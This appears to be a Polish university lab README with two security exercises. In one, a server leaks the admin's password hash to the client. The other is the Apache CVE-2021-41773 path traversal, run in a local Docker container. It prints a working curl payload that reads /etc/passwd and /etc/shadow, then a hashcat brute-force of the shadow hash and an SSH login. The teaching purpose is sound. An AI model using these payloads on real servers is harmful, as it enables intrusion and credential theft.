# __Przygotowanie Środowiska__
- **[Docker Desktop](https://www.docker.com/products/docker-desktop/)**

Docker to platforma do tworzenia, uruchamiania i zarządzania kontenerami oprogramowania. Kontenery to lekkie, samodzielne jednostki oprogramowania, które zawierają wszystko, czego potrzeba do uruchomienia aplikacji, w tym kod, biblioteki, zależności i pliki konfiguracyjne.

- **[John the Ripper](https://www.openwall.com/john/) | [Hashcat](https://hashcat.net/hashcat/)**

<br><br>

# __Hash od Serwera__

Jest to luka utworzona poprzez zwykły ludzki błąd przy projektowaniu systemu logowania. Serwer zamiast sprawdzać prawidłowość hasła u siebie to sprawdza po stronie klienta, przez co atakujący w łatwy sposób może wykorzystać te informacje by złamać hasło.

## **Zaczynamy**:

1. Należy uruchomić serwer oraz client

    **Uruchamianie Klienta:**
    
    Wejdź do katalogu client a następnie wykonaj poniższe komendy:

        ```
        npm ci
        npm start
        ```

    **Uruchamianie Serwera:*
    
    Wejdź do katalogu server a następnie wykonaj poniższe komendy:
    
        ```
        npm ci
        npm start
        ```

2. Teraz uruchom bazę danych w dokerze za pomocą komendy (należy znajdować się w folderze zawierającym plik "docker-compose.yaml"):
    ```
    docker compose up
    ```
## **Zadanie 1**
Zdobądź hash hasła do użytkownika admin, a następnie złam za pomocą dowolnego narzędzia. Zauważ, że przy próbie logowania na konto danego uzytkowika serwer zwraca ci hash jego hasła. Spróbuj go podglądnąć przy pomocy Burpa czy też innych narzędzi.


## **Zadanie 2**
Korzystając z wiedzy zdobytej podczas prezentacji oraz na innych zajęciach, popraw aplikację, tak aby do porównywania haszy dochodziło w odpowiednim miejscu. Czyli:
1. Porównywanie haszy powinno następować bezpośrednio po pobraniu haszu z bazy danych.
2. Serwer nie może pobranego z bazy danych haszu zwracać w odpowiedzi do klienta.




<br><br>

# __Path Traversal__

Path Traversal to poważna luka w zabezpieczeniach, która może być wykorzystywana przez hakerów do uzyskania nieautoryzowanego dostępu do systemu lub do wykonania nieautoryzowanych poleceń na zdalnym komputerze.

**<u>Podana luka została znaleziona w serwerze Apache 2.4.49 oraz 2.4.50 i nazwana [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)</u>**

**Apache** to darmowe, otwartoźródłowe i wieloplatformowe oprogramowanie serwera WWW wydane na licencji Apache License 2.0. Oprogramowanie jest utrzymywane i rozwijane przez organizację non profit Apache Software Foundation.

Podatność **Path Travesal** występuje jeśli serwer posiada następującą konfiguracją

```console
<Directory />
Require all granted
</Directory>
```

W tym przypadku ustawienie `Require all granted` oznacza, że wszyscy użytkownicy mają mieć dostęp do plików i katalogów.


<br>
<br>

## **Zaczynamy**:

1. Należy uruchomić kontener komendą

```console
docker run -p 8090:80 -p 22:22 gekonisko/path-traversal
```

Kontener wystawia dwa port

- http[80]: http://localhost:8090
- ssh[22]: agh@localhost

<br>

2. Korzystając z narzędzi curl, postam, burp itp. wyślij następujące zapytanie

```console
 curl http://localhost:8090/cgi-bin/.%2e/.%2e/.%2e/.%2e etc/passwd
```

Serwer powinien zwrócić zawartość pliku `/etc/passwd` zawierający również specjalne konto **agh**

```console
…
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
agh:x:1000:1000:,,,:/home/agh:/bin/bash
```

## **Zadanie 2**

Serwer ma wystawiony również protokół SSH, twoim zadaniem jest zalogowanie się na użytkownika agh przez protokół ssh `ssh agh@localhost`. Wykorzystaj plik `etc/shadow` aby wyciągnąć hasło użytkownika agh.

<details>
<summary>Rozwązanie</summary>

```console
 curl http://localhost:8090/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/shadow
```

wynik:

```console
...
agh:$6$bDdeQMyxkE4l8q5s$iLIB.yf/lxCMGCAdx8yHiW9/av0JM.gCo5vy7aLpUG9Q/KWbD6m3BfxXFCKuyzFd1urcoGePMJ.pVKogH.sAw1:19364:0:99999:7:::
```

zapisujemy hash w pliku

```
echo '$6$bDdeQMyxkE4l8q5s$iLIB.yf/lxCMGCAdx8yHiW9/av0JM.gCo5vy7aLpUG9Q/KWbD6m3BfxXFCKuyzFd1urcoGePMJ.pVKogH.sAw1' > password
```

uruchamiamy hashcata

```
hashcat -m 1800 -a3 password ?u?u?u
```

Opcja "-m 1800" wskazuje na rodzaj szyfrowania hasła (rodzaj hashu), a w tym przypadku jest to rodzaj hashu SHA-512(Unix). Opcja "-a 3" oznacza, że hashcat będzie używał metody brute-force (przeprowadzenie próby złamania hasła poprzez wypróbowanie wszystkich możliwych kombinacji).

password to plik w którym przechowujemy hash, który będzie przez nas łamany

Jeśli chodzi o ciąg znaków "?u?u?u", to jest to szablon, który określa, jakie hasło będzie szukane [link](https://hashcat.net/wiki/doku.php?id=mask_attack).
?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ

Po złamaniu hasła logujemy sie na serwer

```
ssh agh@localhost
```

</details>
